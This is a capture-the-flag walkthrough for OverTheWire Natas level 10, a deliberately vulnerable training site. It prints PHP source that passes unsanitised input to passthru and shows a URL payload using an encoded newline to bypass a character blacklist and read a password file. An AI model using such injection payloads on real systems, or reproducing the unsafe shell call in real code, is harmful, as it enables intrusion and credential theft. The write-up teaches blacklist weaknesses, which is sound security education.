# Natas Level 9 → Level 10

**Goal:**

Find the password for natas11. This is the same dictionary-search app as Level 9, but this time it filters out shell metacharacters — so you need to find a way around the filter.

# Step 1: Access the level

http://natas10.natas.labs.overthewire.org

Username: natas10
Password: (from previous level )

# Step 2: Read the page

Same as before — a form to search a "dictionary" word.

# Step 3: View the PHP source code

You'll see something like:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST['needle'];
}

if($key != "") {
    if(preg_match('/[;|&]/', $key)) {
        print "Illegal characters!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This time, the code blocks ;, |, and & using a regex filter so the classic Level 9 payload (; cat ...) won't work.

# Step 4: Find allowed injection characters

Notice the filter only blocks ;, |, and &. It does not block newlines. In many shells, a newline character (\n / %0a when URL-encoded) can also separate commands, just like ; does.

# Step 5: Craft the payload using a newline

Use a newline instead of a semicolon to inject your command:

http://natas10.natas.labs.overthewire.org/index.php?needle=%0acat+/etc/natas_webpass/natas11

Here, %0a is the URL-encoded newline character.

# Step 6: Get the password

The output will show the password file's contents:

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

*Lesson learned*

Blacklisting specific "dangerous" characters (like ;, |, &) is fragile and incomplete,  attackers can often find alternative characters (like newlines) that achieve the same effect but aren't covered by the filter. Input validation should use an allow-list of expected/safe characters rather than trying to block every possible dangerous one.